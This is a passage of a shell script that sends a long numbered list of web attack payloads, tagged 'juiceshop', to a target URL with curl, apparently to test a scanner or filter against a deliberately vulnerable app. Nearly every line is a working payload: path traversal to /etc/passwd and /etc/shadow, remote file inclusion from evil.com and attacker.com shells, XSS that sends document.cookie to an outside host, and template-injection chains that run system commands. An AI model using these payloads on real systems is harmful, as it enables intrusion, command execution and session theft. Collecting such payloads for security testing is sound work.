  "$HOST$URI?q=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
do_curl 'juiceshop-0168' 'rfi' 'http://evil.com/shell.txt' \
  "$HOST$URI?q=http%3A%2F%2Fevil.com%2Fshell.txt"
do_curl 'juiceshop-0169' 'rfi' '%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt' \
  "$HOST$URI?q=%2568%2574%2574%2570%253a%252f%252fattacker.com%252fcode.txt"
do_curl 'juiceshop-0170' 'rfi' 'https://evil.com/backdoor.php' \
  "$HOST$URI?q=https%3A%2F%2Fevil.com%2Fbackdoor.php"
do_curl 'juiceshop-0171' 'rfi' '%252f%252fmalicious.com%252fshell.txt' \
  "$HOST$URI?q=%25252f%25252fmalicious.com%25252fshell.txt"
do_curl 'juiceshop-0172' 'rfi' '%5c%5cattacker.com%5cbackdoor.txt' \
  "$HOST$URI?q=%255c%255cattacker.com%255cbackdoor.txt"
do_curl 'juiceshop-0173' 'rfi' 'https://attacker.site/malware.php' \
  "$HOST$URI?q=https%3A%2F%2Fattacker.site%2Fmalware.php"
do_curl 'juiceshop-0174' 'rfi' 'http://evil.com/shell.txt?' \
  "$HOST$URI?q=http%3A%2F%2Fevil.com%2Fshell.txt%3F"
do_curl 'juiceshop-0175' 'xss' 'http://127.0.0.1/evil.txt' \
  "$HOST$URI?q=http%3A%2F%2F127.0.0.1%2Fevil.txt"
do_curl 'juiceshop-0176' 'xss' 'http://[::]/evil.php' \
  "$HOST$URI?q=http%3A%2F%2F%5B%3A%3A%5D%2Fevil.php"
do_curl 'juiceshop-0177' 'rfi' 'http%3A%2F%2Fevil.com%2Fshell.txt' \
  "$HOST$URI?q=http%253A%252F%252Fevil.com%252Fshell.txt"
do_curl 'juiceshop-0178' 'xss' 'http%3A%2F%2F127.0.0.1%2Fevil.txt' \
  "$HOST$URI?q=http%253A%252F%252F127.0.0.1%252Fevil.txt"
do_curl 'juiceshop-0179' 'rfi' 'http://evil.com%00/shell.php' \
  "$HOST$URI?q=http%3A%2F%2Fevil.com%2500%2Fshell.php"
do_curl 'juiceshop-0180' 'rfi' 'http://evil.com//shell.txt' \
  "$HOST$URI?q=http%3A%2F%2Fevil.com%2F%2Fshell.txt"
do_curl 'juiceshop-0181' 'rfi' 'http://ev%69l.com/shell.php' \
  "$HOST$URI?q=http%3A%2F%2Fev%2569l.com%2Fshell.php"
do_curl 'juiceshop-0182' 'xss' 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))' \
  "$HOST$URI?q=eval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29"
do_curl 'juiceshop-0183' 'xss' 'new%20Function('\''alert(1)'\'')()' \
  "$HOST$URI?q=new%2520Function%28%27alert%281%29%27%29%28%29"
do_curl 'juiceshop-0184' 'xss' 'setTimeout('\''%61lert(1)'\'',1000)' \
  "$HOST$URI?q=setTimeout%28%27%2561lert%281%29%27%2C1000%29"
do_curl 'juiceshop-0185' 'xss' 'document['\''write'\'']('\''<img src=x onerror=alert(1)>'\'')' \
  "$HOST$URI?q=document%5B%27write%27%5D%28%27%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%27%29"
do_curl 'juiceshop-0186' 'xss' '<img src="x" onerror="alert(1)">' \
  "$HOST$URI?q=%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%3E"
do_curl 'juiceshop-0187' 'xss' '<a href="javascript:alert(1)">XSS</a>' \
  "$HOST$URI?q=%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E"
do_curl 'juiceshop-0188' 'xss' '<body onload="alert(1)">' \
  "$HOST$URI?q=%3Cbody%20onload%3D%22alert%281%29%22%3E"
do_curl 'juiceshop-0189' 'xss' '<script>document.write('\''<img src="http://example.com/xss.png?c='\'' + document.cookie + '\''">'\'')</script>' \
  "$HOST$URI?q=%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22http%3A%2F%2Fexample.com%2Fxss.png%3Fc%3D%27%20%2B%20document.cookie%20%2B%20%27%22%3E%27%29%3C%2Fscript%3E"
do_curl 'juiceshop-0190' 'xss' '<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>' \
  "$HOST$URI?q=%3Cscript%3Eeval%28String.fromCharCode%2897%2C%20108%2C%20101%2C%20114%2C%20116%2C%2040%2C%2049%2C%2041%29%29%3C%2Fscript%3E"
do_curl 'juiceshop-0191' 'xss' '<img src="x" onerror="eval(atob('\''YWxlcnQoMSk='\''))">' \
  "$HOST$URI?q=%3Cimg%20src%3D%22x%22%20onerror%3D%22eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%22%3E"
do_curl 'juiceshop-0192' 'xss' '<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>' \
  "$HOST$URI?q=%3Cscript%3Evar%20a%3Ddocument.createElement%28%22a%22%29%3Ba.href%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3Ba.click%28%29%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0193' 'xss' '<script>var s=document.createElement("script");s.src="http://example.com/xss.js";document.body.appendChild(s);</script>' \
  "$HOST$URI?q=%3Cscript%3Evar%20s%3Ddocument.createElement%28%22script%22%29%3Bs.src%3D%22http%3A%2F%2Fexample.com%2Fxss.js%22%3Bdocument.body.appendChild%28s%29%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0194' 'xss' '<script>var i=new Image();i.src="http://example.com/xss.png?c="+document.cookie;document.body.appendChild(i);</script>' \
  "$HOST$URI?q=%3Cscript%3Evar%20i%3Dnew%20Image%28%29%3Bi.src%3D%22http%3A%2F%2Fexample.com%2Fxss.png%3Fc%3D%22%2Bdocument.cookie%3Bdocument.body.appendChild%28i%29%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0195' 'xss' '<script>fetch("http://example.com/xss.php?c="+document.cookie);</script>' \
  "$HOST$URI?q=%3Cscript%3Efetch%28%22http%3A%2F%2Fexample.com%2Fxss.php%3Fc%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0196' 'xss' '<script>var x=new XMLHttpRequest();x.open("GET","http://example.com/xss.php?c="+document.cookie,true);x.send();</script>' \
  "$HOST$URI?q=%3Cscript%3Evar%20x%3Dnew%20XMLHttpRequest%28%29%3Bx.open%28%22GET%22%2C%22http%3A%2F%2Fexample.com%2Fxss.php%3Fc%3D%22%2Bdocument.cookie%2Ctrue%29%3Bx.send%28%29%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0197' 'xss' '<script>var s=document.createElement("iframe");s.src="http://example.com/xss.php?c="+document.cookie;document.body.appendChild(s);</script>' \
  "$HOST$URI?q=%3Cscript%3Evar%20s%3Ddocument.createElement%28%22iframe%22%29%3Bs.src%3D%22http%3A%2F%2Fexample.com%2Fxss.php%3Fc%3D%22%2Bdocument.cookie%3Bdocument.body.appendChild%28s%29%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0198' 'xss' '<script>var l=document.createElement("link");l.rel="stylesheet";l.href="http://example.com/xss.css";document.head.appendChild(l);</script>' \
  "$HOST$URI?q=%3Cscript%3Evar%20l%3Ddocument.createElement%28%22link%22%29%3Bl.rel%3D%22stylesheet%22%3Bl.href%3D%22http%3A%2F%2Fexample.com%2Fxss.css%22%3Bdocument.head.appendChild%28l%29%3B%3C%2Fscript%3E"
do_curl 'juiceshop-0199' 'xss' '&#x3C;img src=x onerror=alert('\''Payload1'\'')&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bimg%20src%3Dx%20onerror%3Dalert%28%27Payload1%27%29%26%23x3E%3B"
do_curl 'juiceshop-0200' 'xss' '&#x3C;svg onload=alert('\''Payload2'\'')&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bsvg%20onload%3Dalert%28%27Payload2%27%29%26%23x3E%3B"
do_curl 'juiceshop-0201' 'xss' '&#x3C;object data=javascript:alert('\''Payload3'\'')&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bobject%20data%3Djavascript%3Aalert%28%27Payload3%27%29%26%23x3E%3B"
do_curl 'juiceshop-0202' 'xss' '&#x3C;body onload=alert('\''Payload4'\'')&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bbody%20onload%3Dalert%28%27Payload4%27%29%26%23x3E%3B"
do_curl 'juiceshop-0203' 'xss' '&#x3C;img src=x:alert(alt) onerror=eval(src) alt='\''Payload5'\''&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bimg%20src%3Dx%3Aalert%28alt%29%20onerror%3Deval%28src%29%20alt%3D%27Payload5%27%26%23x3E%3B"
do_curl 'juiceshop-0204' 'xss' '&#x3C;script&#x3E;eval(String.fromCharCode(97,108,101,114,116,40,39,Payload6,39,41))&#x3C;/script&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bscript%26%23x3E%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C39%2CPayload6%2C39%2C41%29%29%26%23x3C%3B%2Fscript%26%23x3E%3B"
do_curl 'juiceshop-0205' 'xss' '&#x3C;!--%2Balert('\''Payload7'\'')%2B--&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3B%21--%252Balert%28%27Payload7%27%29%252B--%26%23x3E%3B"
do_curl 'juiceshop-0206' 'xss' '&#x3C;style&#x3E;*\{x:expression(alert('\''Payload8'\''))\}&#x3C;/style&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bstyle%26%23x3E%3B%2A%5C%7Bx%3Aexpression%28alert%28%27Payload8%27%29%29%5C%7D%26%23x3C%3B%2Fstyle%26%23x3E%3B"
do_curl 'juiceshop-0207' 'xss' '&#x3C;input value=`` onfocus=alert('\''Payload9'\'') autofocus&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Binput%20value%3D%60%60%20onfocus%3Dalert%28%27Payload9%27%29%20autofocus%26%23x3E%3B"
do_curl 'juiceshop-0208' 'xss' '&#x3C;form&#x3E;&#x3C;button onclick=alert('\''Payload10'\'')&#x3E;X&#x3C;/button&#x3E;&#x3C;/form&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bform%26%23x3E%3B%26%23x3C%3Bbutton%20onclick%3Dalert%28%27Payload10%27%29%26%23x3E%3BX%26%23x3C%3B%2Fbutton%26%23x3E%3B%26%23x3C%3B%2Fform%26%23x3E%3B"
do_curl 'juiceshop-0209' 'xss' '&#x3C;iframe src=javascript:alert('\''Payload11'\'')&#x3E;&#x3C;/iframe&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Biframe%20src%3Djavascript%3Aalert%28%27Payload11%27%29%26%23x3E%3B%26%23x3C%3B%2Fiframe%26%23x3E%3B"
do_curl 'juiceshop-0210' 'xss' '&#x3C;a href=javascript:alert('\''Payload12'\'')&#x3E;Link&#x3C;/a&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Ba%20href%3Djavascript%3Aalert%28%27Payload12%27%29%26%23x3E%3BLink%26%23x3C%3B%2Fa%26%23x3E%3B"
do_curl 'juiceshop-0211' 'xss' '&#x3C;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4&#x3E;Link&#x3C;/a&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Ba%20href%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4%26%23x3E%3BLink%26%23x3C%3B%2Fa%26%23x3E%3B"
do_curl 'juiceshop-0212' 'xss' '&#x3C;div onmouseover=alert('\''Payload14'\'')&#x3E;Hover over me&#x3C;/div&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bdiv%20onmouseover%3Dalert%28%27Payload14%27%29%26%23x3E%3BHover%20over%20me%26%23x3C%3B%2Fdiv%26%23x3E%3B"
do_curl 'juiceshop-0213' 'xss' '&#x3C;input type=image src=x onerror=alert('\''Payload15'\'')&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Binput%20type%3Dimage%20src%3Dx%20onerror%3Dalert%28%27Payload15%27%29%26%23x3E%3B"
do_curl 'juiceshop-0214' 'xss' '&#x3C;audio src=javascript:alert('\''Payload16'\'')&#x3E;&#x3C;/audio&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Baudio%20src%3Djavascript%3Aalert%28%27Payload16%27%29%26%23x3E%3B%26%23x3C%3B%2Faudio%26%23x3E%3B"
do_curl 'juiceshop-0215' 'xss' '&#x3C;video src=javascript:alert('\''Payload17'\'')&#x3E;&#x3C;/video&#x3E;' \
  "$HOST$URI?q=%26%23x3C%3Bvideo%20src%3Djavascript%3Aalert%28%27Payload17%27%29%26%23x3E%3B%26%23x3C%3B%2Fvideo%26%23x3E%3B"
do_curl 'juiceshop-0216' 'ssti' '<%= 7 * 7 %>' \
  "$HOST$URI?q=%3C%25%3D%207%20%2A%207%20%25%3E"
do_curl 'juiceshop-0217' 'ssti' '$\{7*7\}' \
  "$HOST$URI?q=%24%5C%7B7%2A7%5C%7D"
do_curl 'juiceshop-0218' 'xss' '$\{T(java.lang.Runtime).getRuntime().exec('\''id'\'')\}' \
  "$HOST$URI?q=%24%5C%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%5C%7D"
do_curl 'juiceshop-0219' 'ssti' '%7B%7B7*7%7D%7D' \
  "$HOST$URI?q=%257B%257B7%2A7%257D%257D"
do_curl 'juiceshop-0220' 'ssti' '%24%7B7*7%7D' \
  "$HOST$URI?q=%2524%257B7%2A7%257D"
do_curl 'juiceshop-0221' 'ssti' '$\{3*3\}' \
  "$HOST$URI?q=%24%5C%7B3%2A3%5C%7D"
do_curl 'juiceshop-0222' 'ssti' '$\{\{7*7\}\}' \
  "$HOST$URI?q=%24%5C%7B%5C%7B7%2A7%5C%7D%5C%7D"
do_curl 'juiceshop-0223' 'ssti' '@(1+2)' \
  "$HOST$URI?q=%40%281%2B2%29"
do_curl 'juiceshop-0224' 'xss' '<%= File.open('\''/etc/passwd'\'').read %>' \
  "$HOST$URI?q=%3C%25%3D%20File.open%28%27%2Fetc%2Fpasswd%27%29.read%20%25%3E"
do_curl 'juiceshop-0225' 'ssti' '<#assign ex = "freemarker.template.utility.Execute"?new()>$\{ ex("id")\}' \
  "$HOST$URI?q=%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%5C%7B%20ex%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0226' 'ssti' '[#assign ex = '\''freemarker.template.utility.Execute'\''?new()]$\{ ex('\''id'\'')\}' \
  "$HOST$URI?q=%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%5C%7B%20ex%28%27id%27%29%5C%7D"
do_curl 'juiceshop-0227' 'ssti' '$\{"freemarker.template.utility.Execute"?new()("id")\}' \
  "$HOST$URI?q=%24%5C%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0228' 'xss' '$\{T(java.lang.System).getenv()\}' \
  "$HOST$URI?q=%24%5C%7BT%28java.lang.System%29.getenv%28%29%5C%7D"
do_curl 'juiceshop-0229' 'xss' '$\{T(java.lang.Runtime).getRuntime().exec('\''cat etc/passwd'\'')\}' \
  "$HOST$URI?q=%24%5C%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc%2Fpasswd%27%29%5C%7D"
do_curl 'juiceshop-0230' 'xss' '$\{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())\}$\{self.module.cache.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%5C%7D%24%5C%7Bself.module.cache.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0231' 'xss' '$\{self.module.runtime.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0232' 'xss' '$\{self.template.module.cache.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.cache.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0233' 'xss' '$\{self.module.cache.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0234' 'xss' '$\{self.__init__.__globals__['\''util'\''].os.system('\''id'\'')\}' \
  "$HOST$URI?q=%24%5C%7Bself.__init__.__globals__%5B%27util%27%5D.os.system%28%27id%27%29%5C%7D"
do_curl 'juiceshop-0235' 'xss' '$\{self.template.module.runtime.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0236' 'xss' '$\{self.module.filters.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0237' 'xss' '$\{self.module.runtime.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0238' 'xss' '$\{self.module.runtime.exceptions.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0239' 'xss' '$\{self.template.__init__.__globals__['\''os'\''].system('\''id'\'')\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.__init__.__globals__%5B%27os%27%5D.system%28%27id%27%29%5C%7D"
do_curl 'juiceshop-0240' 'xss' '$\{self.module.cache.util.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.cache.util.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0241' 'xss' '$\{self.module.runtime.util.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.util.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0242' 'xss' '$\{self.template._mmarker.module.cache.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.cache.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0243' 'xss' '$\{self.template.module.cache.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0244' 'xss' '$\{self.module.cache.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.cache.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0245' 'xss' '$\{self.template._mmarker.module.runtime.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.runtime.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0246' 'xss' '$\{self.attr._NSAttr__parent.module.cache.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.cache.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0247' 'xss' '$\{self.template.module.filters.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0248' 'xss' '$\{self.template.module.runtime.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0249' 'xss' '$\{self.module.filters.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.filters.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0250' 'xss' '$\{self.module.runtime.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0251' 'xss' '$\{self.template.module.runtime.exceptions.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0252' 'xss' '$\{self.attr._NSAttr__parent.module.runtime.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.runtime.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0253' 'xss' '$\{self.context._with_template.module.cache.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.cache.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0254' 'xss' '$\{self.module.runtime.exceptions.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0255' 'xss' '$\{self.template.module.cache.util.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.cache.util.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0256' 'xss' '$\{self.context._with_template.module.runtime.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.runtime.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0257' 'xss' '$\{self.module.cache.util.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.cache.util.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0258' 'xss' '$\{self.template.module.runtime.util.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.util.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0259' 'xss' '$\{self.module.runtime.util.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.util.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0260' 'xss' '$\{self.module.runtime.exceptions.traceback.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.traceback.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0261' 'xss' '$\{self.module.runtime.exceptions.util.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.util.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0262' 'xss' '$\{self.template._mmarker.module.cache.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0263' 'xss' '$\{self.template.module.cache.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.cache.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0264' 'xss' '$\{self.attr._NSAttr__parent.template.module.cache.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.template.module.cache.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0265' 'xss' '$\{self.template._mmarker.module.filters.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0266' 'xss' '$\{self.template._mmarker.module.runtime.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0267' 'xss' '$\{self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0268' 'xss' '$\{self.template._mmarker.module.runtime.exceptions.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template._mmarker.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0269' 'xss' '$\{self.template.module.filters.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.filters.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0270' 'xss' '$\{self.template.module.runtime.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0271' 'xss' '$\{self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.template.module.runtime.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0272' 'xss' '$\{self.context._with_template._mmarker.module.cache.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template._mmarker.module.cache.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0273' 'xss' '$\{self.template.module.runtime.exceptions.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.exceptions.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0274' 'xss' '$\{self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0275' 'xss' '$\{self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0276' 'xss' '$\{self.context._with_template.module.cache.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.cache.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0277' 'xss' '$\{self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0278' 'xss' '$\{self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0279' 'xss' '$\{self.context._with_template._mmarker.module.runtime.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template._mmarker.module.runtime.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0280' 'xss' '$\{self.context._with_template.module.filters.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0281' 'xss' '$\{self.context._with_template.module.runtime.compat.inspect.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0282' 'xss' '$\{self.context._with_template.module.runtime.exceptions.util.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0283' 'xss' '$\{self.template.module.runtime.exceptions.traceback.linecache.os.system("id")\}' \
  "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.exceptions.traceback.linecache.os.system%28%22id%22%29%5C%7D"
do_curl 'juiceshop-0284' 'xss' '..%2f..%2f..%2fwin.ini' \
  "$HOST$URI?q=..%252f..%252f..%252fwin.ini"
do_curl 'juiceshop-0285' 'xss' '/var/www/html/../../../etc/shadow' \
